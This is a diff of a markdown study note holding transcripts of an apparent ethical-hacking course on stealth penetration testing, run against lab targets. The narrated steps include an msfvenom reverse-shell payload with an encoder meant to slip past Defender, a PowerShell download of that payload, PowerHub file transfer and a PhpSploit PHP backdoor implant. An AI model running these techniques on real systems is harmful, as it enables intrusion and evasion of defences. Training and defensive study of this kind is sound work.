@@ -78,12 +78,11 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Taking the next step in your ethical hacking career
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/taking-the-next-step-in-your-ethical-hacking-career?u=76281980)
+#### [Taking the next step in your ethical hacking career](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/taking-the-next-step-in-your-ethical-hacking-career?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/taking-the-next-step-in-your-ethical-hacking-career?u=76281980&t=0)** - [Malcolm] As we build our careers in ethical hacking, we'll be faced with more challenging areas of penetration testing.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/taking-the-next-step-in-your-ethical-hacking-career?u=76281980&t=0)** - [Malcolm] As we build our careers in [[Ethical Hacking]], we'll be faced with more challenging areas of [[Penetration Testing]].
 >
 > **[0:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/taking-the-next-step-in-your-ethical-hacking-career?u=76281980&t=7)** Basic enumeration may not provide everything we need and we'll want to use more advanced enumeration tools and techniques.
 >
@@ -101,37 +100,35 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Ethical Hacking]] (3), [[Penetration Testing]] (1), application (1), career (1)
+> **Frameworks & Libraries:** [[Ethical Hacking]] (3), [[Penetration Testing]] (1)
 > **Speakers:** - [malcolm] (1)
 
-#### What you should know
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980)
+#### [What you should know](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=0)** - [Instructor] This is a practical course.
 >
-> **[0:02](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=2)** We'll be using Kali Linux-based tools to do testing, and we'll be using our own test network and some targets in the Offensive Security online penetration testing lab.
+> **[0:02](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=2)** We'll be using [[Kali Linux]]-based tools to do testing, and we'll be using our own test network and some targets in the Offensive Security online [[Penetration Testing]] lab.
 >
 > **[0:13](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=13)** You'll need to have a good working knowledge of Kali and a basic foundation of hands-on testing.
 >
-> **[0:19](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=19)** You should have a working knowledge of ethical hacking tools, and you should have taken the ethical hacking series of courses.
+> **[0:19](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=19)** You should have a working knowledge of [[Ethical Hacking]] tools, and you should have taken the ethical hacking series of courses.
 >
 > **[0:26](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=26)** If you've taken the advanced Kali Linux course, that would be an advantage.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Kali Linux]] (2), [[Ethical Hacking]] (2), [[Security]] (1), [[Penetration Testing]] (1)
+> **Frameworks & Libraries:** [[Kali Linux]] (2), [[Ethical Hacking]] (2), [[Penetration Testing]] (1)
 > **Definitions:** is a  (1)
 > **Prerequisites:** you'll need (1)
 > **Speakers:** - [instructor] (1)
 
-#### Disclaimer
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/disclaimer?u=76281980)
+#### [Disclaimer](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/disclaimer?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of advanced penetration testing courses in which we use Kali Linux together with some third party commercial and open source testing software.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of advanced [[Penetration Testing]] courses in which we use [[Kali Linux]] together with some third party commercial and open source testing software.
 >
 > **[0:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/disclaimer?u=76281980&t=11)** While we've done our best to ensure that the tools we use and the sites we reference are legitimate, testing sites can be targets for hackers and we can't provide any assurance that these sites might not be compromised when you visit them.
 >
@@ -151,8 +148,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Being detected
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980)
+#### [Being detected](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -168,15 +164,15 @@ created: 2026-05-02
 >
 > **[0:35](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=35)** Let's see how detection systems work.
 >
-> **[0:38](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=38)** We'll make a standard MSFvenom payload for Windows: msfvenom -p windows/shell/ reverse_tcp LHOST=192.168.1.249 LPORT=2222 -f exe.
+> **[0:38](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=38)** We'll make a standard [[Metasploit|MSFvenom]] payload for [[Windows]]: msfvenom -p windows/shell/ reverse_tcp LHOST=192.168.1.249 LPORT=2222 -f exe.
 >
 > **[1:15](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=75)** And we'll save that as scmd.exe.
 >
-> **[1:21](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=81)** Okay, we can use Python to set up a web server: python3 -m http.server, port 80.
+> **[1:21](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=81)** Okay, we can use [[Python (Programming Language)|Python]] to set up a web server: python3 -m http.server, port 80.
 >
 > **[1:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=97)** I'm logged into my Windows workstation as Sam Spade.
 >
-> **[1:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=100)** So now let's use PowerShell to get the payload file.
+> **[1:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=100)** So now let's use [[Powershell]] to get the payload file.
 >
 > **[1:44](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=104)** And we'll invoke WebRequest http colon, 192.168.1.249 /scmd.exe.
 >
@@ -190,7 +186,7 @@ created: 2026-05-02
 >
 > **[2:35](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=155)** After a few seconds, we can run a dir again, and we can see the file has been removed.
 >
-> **[2:43](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=163)** If we go into Microsoft Defender and look at Protection history,
+> **[2:43](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=163)** If we go into [[Microsoft Defender]] and look at Protection history,
 >
 > **[2:57](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=177)** we can see that our file has been quarantined because it's a severe threat.
 >
@@ -198,7 +194,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (3), [[Microsoft Defender]] (2), [[Python (Programming Language)|Python]] (1), web (1), [[Powershell]] (1)
+> **Frameworks & Libraries:** [[Windows]] (3), [[Metasploit|Msfvenom]] (2), [[Microsoft Defender]] (2), [[Python (Programming Language)|Python]] (1), [[Powershell]] (1)
 > **CLI Commands:** find (1), make (1), python (1), python3 (1)
 > **Env Vars:** lhost (1), lport (1)
 > **Versions:** 192.168.1 (2)
@@ -207,16 +203,15 @@ created: 2026-05-02
 > **Tools:** powershell (1)
 > **Prerequisites:** set up (1)
 
-#### Trying stealthy shells
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980)
+#### [Trying stealthy shells](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=0)** - [Narrator] MSFvenom provides an encoding feature which enables us to create stealthy shells using the -e option.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=0)** - [Narrator] [[Metasploit|MSFvenom]] provides an encoding feature which enables us to create stealthy shells using the -e option.
 >
 > **[0:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=7)** Let's check this out and see how effective it is.
 >
-> **[0:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=11)** MSFvenom - p windows/shell/reverse tcp
+> **[0:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=11)** MSFvenom - p [[Windows]]/shell/reverse tcp
 >
 > **[0:27](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=27)** and we'll use the encoding feature x86/shikata ga nai
 >
@@ -258,17 +253,17 @@ created: 2026-05-02
 >
 > **[3:16](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=196)** The format we're going to produce is exe and we'll produce this time zcmd.exe (pause) Okay. Let's set up our web portal again Python3-m http.server 80
 >
-> **[3:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=217)** And again in PowerShell we'll Invoke-WebRequest http 192.169.1.249/zcmd.exe
+> **[3:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=217)** And again in [[Powershell]] we'll Invoke-WebRequest http 192.169.1.249/zcmd.exe
 >
 > **[3:58](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=238)** and we'll use basic parsing and Outfile to zcmd.exe
 >
 > **[4:14](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=254)** that copies over and we can see it in our folder.
 >
-> **[4:17](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=257)** (pause) Microsoft defender still detects it despite applying encryption to the code.
+> **[4:17](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=257)** (pause) [[Microsoft Defender]] still detects it despite applying encryption to the code.
 >
 > **[4:27](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=267)** We used to be able to generate shell code using MSFvenom to load our code directly onto a Windows host with little effort.
 >
-> **[4:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=274)** However, the encoding approaches used by MSFvenom are now being detected by Windows Defender and it's become difficult for an inexperienced, ethical hacker to get a payload running.
+> **[4:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=274)** However, the encoding approaches used by MSFvenom are now being detected by Windows [[Microsoft Defender|Defender]] and it's become difficult for an inexperienced, ethical hacker to get a payload running.
 >
 > **[4:46](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=286)** Windows has introduced the Antimalware Scan Interface which enables Windows Defender to scan scripts and the Windows Defender Advanced Threat Protection with its ability to leverage machine learning.
 >
@@ -278,7 +273,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (10), [[Microsoft Defender|Defender]] (3), feature (2), web (2), [[Powershell]] (1)
+> **Frameworks & Libraries:** [[Windows]] (10), [[Metasploit|Msfvenom]] (5), [[Microsoft Defender|Defender]] (3), [[Powershell]] (1), [[Microsoft Defender]] (1)
 > **Non-Speech:** (typing) (6)
 > **Versions:** 192.168.1 (3), 192.169.1 (1)
 > **Speakers:** - [narrator] (1), - p (1), - use (1)
@@ -286,14 +281,13 @@ created: 2026-05-02
 > **Prerequisites:** set up (2)
 > **Tools:** powershell (1)
 
-#### Leaving footprints
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980)
+#### [Leaving footprints](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=0)** - [Instructor] When we access and work on a platform, we're likely to have our presence recorded in some level of audit logs.
 >
-> **[0:06](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=6)** Let's check the audit logs on our Windows workstation and see what we can find out about our activities so far.
+> **[0:06](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=6)** Let's check the audit logs on our [[Windows]] workstation and see what we can find out about our activities so far.
 >
 > **[0:13](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=13)** We'll start the Windows Event Viewer as system administrator.
 >
@@ -321,7 +315,7 @@ created: 2026-05-02
 >
 > **[1:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=97)** Let's check the application and services logs.
 >
-> **[1:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=102)** Microsoft, Windows, and we'll check first of all Windows Defender, operational logs.
+> **[1:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=102)** [[Microsoft]], Windows, and we'll check first of all Windows [[Microsoft Defender|Defender]], operational logs.
 >
 > **[1:58](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=118)** Again, find Sam Spade account.
 >
@@ -329,7 +323,7 @@ created: 2026-05-02
 >
 > **[2:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=131)** And as we scroll down we can see it's been logged against SSpade01.
 >
-> **[2:20](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=140)** We can also check in the same area our PowerShell logs, the operational logs.
+> **[2:20](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=140)** We can also check in the same area our [[Powershell]] logs, the operational logs.
 >
 > **[2:29](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=149)** Let's take a look at the log for executing a remote command and filter the current logs on event ID 4104.
 >
@@ -347,7 +341,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (6), [[Security]] (3), [[Microsoft Defender|Defender]] (2), application (1), [[Microsoft]] (1)
+> **Frameworks & Libraries:** [[Windows]] (6), [[Microsoft Defender|Defender]] (2), [[Microsoft]] (1), [[Powershell]] (1)
 > **CLI Commands:** find (6)
 > **UI Navigation:** scroll down (2), right-click (1), select the (1)
 > **Definitions:** is an  (1), is a  (1)
@@ -360,8 +354,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### What is living off the land?
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980)
+#### [What is living off the land?](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -377,7 +370,7 @@ created: 2026-05-02
 >
 > **[0:45](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=45)** We don't have to worry about compatibility with the target or library dependencies. Building implants and tools that are stealthy enough to avoid detection and reliable enough to operate in a wide range of environments is expensive.
 >
-> **[0:58](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=58)** Living off the land isn't. For Windows, PowerShell has been the built-in tool of choice for living off the land.
+> **[0:58](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=58)** Living off the land isn't. For [[Windows]], [[Powershell]] has been the built-in tool of choice for living off the land.
 >
 > **[1:05](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=65)** There's also the cmd.exe command line shell which lets us do a lot of reconnaissance and the cscript.exe shell which provides visual basic scripting.
 >
@@ -389,15 +382,15 @@ created: 2026-05-02
 >
 > **[1:35](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=95)** And, regedit enables storing information we might need, particularly for persistence.
 >
-> **[1:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=100)** Living off the land in the Linux environment is similar but easier given the more extensive tools available.
+> **[1:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=100)** Living off the land in the [[Linux]] environment is similar but easier given the more extensive tools available.
 >
-> **[1:46](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=106)** Netcat, scp, curl and wget are often installed.
+> **[1:46](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=106)** [[Netcat]], scp, curl and wget are often installed.
 >
 > **[1:50](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=110)** And, grep and find provide much of what's needed for file-based reconnaissance.
 >
 > **[1:55](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=115)** There's also awk, gawk, gdb, and other tools which we can use or exploit directly.
 >
-> **[2:01](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=121)** In 2019, Microsoft reported a large number of Astaroth attacks.
+> **[2:01](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=121)** In 2019, [[Microsoft]] reported a large number of Astaroth attacks.
 >
 > **[2:06](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=126)** Astaroth is an information stealing malware that lives off the land.
 >
@@ -405,9 +398,9 @@ created: 2026-05-02
 >
 > **[2:19](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=139)** Originally, it leverage wmic for its activities but more recently, has been using alternate data streams.
 >
-> **[2:28](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=148)** Astaroth starts as the result of a successful spear fishing attack and drops a one line JavaScript into iExplorer.exe.
+> **[2:28](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=148)** Astaroth starts as the result of a successful spear fishing attack and drops a one line [[JavaScript]] into iExplorer.exe.
 >
-> **[2:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=157)** This executes to fetch the main script into memory.
+> **[2:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=157)** This executes to [[Fetch]] the main script into memory.
 >
 > **[2:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=160)** It then uses the bits admin tool to download binary content, reconstitute it, and store it into an alternate data stream that it holds in Desktop.ini.
 >
@@ -419,7 +412,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** data (3), [[Windows]] (1), [[Powershell]] (1), [[Scripting]] (1), [[Linux]] (1)
+> **Frameworks & Libraries:** [[Windows]] (1), [[Powershell]] (1), [[Linux]] (1), [[Netcat]] (1), [[Microsoft]] (1)
 > **CLI Commands:** curl (1), wget (1), grep (1), find (1), awk (1)
 > **Tools:** command line (2), powershell (1)
 > **Definitions:** known as (1), is an  (1), is a  (1)
@@ -428,26 +421,25 @@ created: 2026-05-02
 > **Analogies:** such as (1)
 > **Speakers:** - if (1)
 
-#### Using PowerHub
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980)
+#### [Using PowerHub](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=0)** - [Narrator] While we can attempt to copy standard tools such as Netcat into windows, we're often defeated by windows defender which detects these as malware tools.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=0)** - [Narrator] While we can attempt to copy standard tools such as [[Netcat]] into [[Windows]], we're often defeated by windows [[Microsoft Defender|defender]] which detects these as malware tools.
 >
 > **[0:09](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=9)** PowerHub has been developed as a more sophisticated and stealthy means of transferring files in and out of a target.
 >
-> **[0:16](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=16)** We can download this from Adrian Vollmer GitHub site shown here.
+> **[0:16](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=16)** We can download this from Adrian Vollmer [[GitHub]] site shown here.
 >
 > **[0:20](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=20)** Okay, let's do exactly that.
 >
-> **[0:22](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=22)** Git clone HTTPS [github.com](https://github.com),
+> **[0:22](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=22)** [[Git]] clone HTTPS [github.com](https://github.com),
 >
 > **[0:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=34)** Adrian Vollmer PowerHub dot git.
 >
 > **[0:45](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=45)** Okay, and let's start PowerHub up in its simplest form.
 >
-> **[0:49](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=49)** We'll CD PowerHub and Python three powerhub.py.
+> **[0:49](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=49)** We'll CD PowerHub and [[Python (Programming Language)|Python]] three powerhub.py.
 >
 > **[1:03](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=63)** And we'll put our IP address 192.168.1.249.
 >
@@ -459,7 +451,7 @@ created: 2026-05-02
 >
 > **[1:43](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=103)** As the target we'll be using is windows.
 >
-> **[1:45](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=105)** We'll keep the PowerShell launcher, but we could change that to a number of other environments, command bash vbscript and so on.
+> **[1:45](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=105)** We'll keep the [[Powershell]] launcher, but we could change that to a number of other environments, command bash vbscript and so on.
 >
 > **[1:55](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=115)** The command which we'll use to connect to PowerHub from our target is shown in purple.
 >
@@ -501,7 +493,7 @@ created: 2026-05-02
 >
 > **[4:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=274)** Let's start our reconnaissance with a basic check of the local groups.
 >
-> **[4:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=280)** Get dash local group convert two JSON,
+> **[4:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=280)** Get dash local group convert two [[JSON]],
 >
 > **[4:57](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=297)** (keyboard clicks) out file groups dot JSON.
 >
@@ -527,7 +519,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[JSON]] (6), [[Windows]] (3), [[GitHub]] (2), [[Git]] (2), web (2)
+> **Frameworks & Libraries:** [[JSON]] (6), [[Windows]] (3), [[GitHub]] (2), [[Git]] (2), [[Powershell]] (2)
 > **Env Vars:** json (6), http (2), https (1), iex (1)
 > **Tools:** github (2), powershell (2), bash (1)
 > **CLI Commands:** git (2), cd (1), python (1)
@@ -536,22 +528,21 @@ created: 2026-05-02
 > **File Paths:** powerhub.py (1)
 > **URLs:** [github.com](https://github.com) (1)
 
-#### Using the PHPSploit shell
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980)
+#### [Using the PHPSploit shell](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=0)** - [Instructor] PhpSploit is a stealthy backdoor post-implementation tool which provides a shell command interface to a backdoor PHP server.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=0)** - [Instructor] PhpSploit is a stealthy backdoor post-implementation tool which provides a shell command interface to a backdoor [[PHP]] server.
 >
 > **[0:09](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=9)** The implant itself is a single line of PHP code, which needs to be installed at some location in the website.
 >
-> **[0:16](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=16)** We'll clone the tool git clone HTTPS [github.com](https://github.com) nil 0x42 PhpSploit.
+> **[0:16](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=16)** We'll clone the tool [[Git]] clone HTTPS [[[GitHub]].com](https://github.com) nil 0x42 PhpSploit.
 >
 > **[0:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=40)** Okay. And then we need to go into PhpSploit and pip3 install -r.
 >
 > **[0:53](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=53)** Any requirements that aren't already in our system.
 >
-> **[1:01](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=61)** We've got a PHP website called Mutillidae Two, that OWASP provides for testing, and we'll use this as our target.
+> **[1:01](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=61)** We've got a PHP website called Mutillidae Two, that [[OWASP]] provides for testing, and we'll use this as our target.
 >
 > **[1:09](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=69)** This can be downloaded from the site shown here.
 >
@@ -563,7 +554,7 @@ created: 2026-05-02
 >
 > **[1:31](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=91)** Let's check what the file we've uploaded looks like.
 >
-> **[1:35](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=95)** Cat/var/www/HTML, our web root,
+> **[1:35](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=95)** Cat/var/www/[[HTML]], our web root,
 >
 > **[1:44](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=104)** Mutillidae/test, and we called it "pat.php".
 >
